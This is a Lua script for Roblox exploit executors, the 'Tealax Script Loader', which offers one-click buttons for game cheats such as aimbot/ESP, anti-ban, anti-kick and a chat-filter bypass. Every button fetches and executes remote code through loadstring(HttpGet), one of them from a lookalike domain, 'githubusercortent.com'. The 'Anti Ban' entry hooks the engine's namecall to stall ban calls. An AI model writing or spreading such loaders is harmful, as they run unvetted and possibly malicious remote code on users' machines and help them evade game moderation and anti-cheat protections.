--// Tealax Script Loader
-- UI Library (OrionLib) kullanılıyor
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()

local Window = OrionLib:MakeWindow({
    Name = "Tealax Script Loader",
    HidePremium = false,
    SaveConfig = false,
    IntroEnabled = false,
    IntroText = "Tealax Loader"
})

-- INFO TAB
local InfoTab = Window:MakeTab({
    Name = "Info",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

InfoTab:AddParagraph("Tealax Script Loader", "Made by Tealax Development Team.\nUse at your own risk, some scripts may be patched or unsafe.")
InfoTab:AddButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard("https://discord.gg/tealaxhub") -- burayı kendi linkinle değiştir
        OrionLib:MakeNotification({
            Name = "Copied",
            Content = "Discord invite copied to clipboard!",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})

-- SCRIPTS TAB
local ScriptsTab = Window:MakeTab({
    Name = "Scripts",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Script list
local scripts = {
    {"The Strongle Battlegrounds", 'loadstring(game:HttpGet("https://raw.githubusercortent.com/BaconBossScript/TSB/main/TSB"))()'},
    {"Soluna GUI", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/main.lua", true))()'},
    {"Murder Mystery 2 (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/murder-mystery-2.lua", true))()'},
    {"Murder Mystery 2 (XHub)", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/CycleScripts/Official/refs/heads/main/freemium"))()'},
    {"Brookhaven RP (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/brookhaven.lua", true))()'},
    {"Big Paintball 2 (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/big-paintball-2.lua", true))()'},
    {"Murderers vs Sheriffs Duels (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/murderers-vs-sheriffs-duels.lua", true))()'},
    {"Bladeball (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/bladeball.lua", true))()'},
    {"Flee the Facility (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/flee-the-facility.lua", true))()'},
    {"Grow a Garden (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/grow-a-garden.lua", true))()'},
    {"Combat Warriors (Soluna)", 'loadstring(game:HttpGet("https://soluna-script.vercel.app/combat-warriors.lua", true))()'},
    {"Adopt Me (EclipseHub)", [[
        getgenv().mainKey = "nil"
        local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"
        c(a and b,"Executor not Supported")
        a(b({Url=e.."?key="..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
    ]]},
    {"Auaqa Aimbot ESP", [[
        getgenv().Key = "AuaqaHUB17238"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AuaqaScripts/Auaqashub/refs/heads/main/Loader"))()
    ]]},
    {"Auaqa AntiAFK", [[
        getgenv().Key = "AuaqaHUB17238"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AuaqaScripts/AntiAFK/refs/heads/main/AFK"))()
    ]]},
    {"Blox Fruits", 'loadstring(game:HttpGet("https://pastefy.app/3p48JfRa/raw"))()'},
    {"Steal a Brain Rot", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/comppfun/script/refs/heads/main/script"))()'},
    {"Legends of Speed (OrbitSC)", 'loadstring(game:HttpGet("https://orbitsc.net/los"))()'},
    {"Frontlines ESP/Aim (OrbitSC)", 'loadstring(game:HttpGet("https://orbitsc.net/frontlines"))()'},
    {"Anti Kick", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/raavenkkj/anti-kick/main/anti-kick.lua"))()'},
    {"Anti Ban", [[
        local X;
        X = hookmetamethod(game, "__namecall", function(self, ...)
            if getnamecallmethod() == "Ban" then
                return wait(9e9)
            end
            return X(self, ...)
        end)
    ]]},
    {"Chat Bypass", [[
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass",true))()
        end)
    ]]},
    {"Car Crash System", 'loadstring(game:HttpGet("https://raw.githubusercontent.com/KevinMitnickHKR/Script-Documents/refs/heads/main/Car%20Crash%20System"))()'},
    {"Doors Universal (Rael Hub)", 'loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rael-Hub-27610"))()'}
}

-- Add buttons dynamically
for _, s in ipairs(scripts) do
    ScriptsTab:AddButton({
        Name = s[1],
        Callback = function()
            loadstring(s[2])()
        end
    })
end

OrionLib:Init()
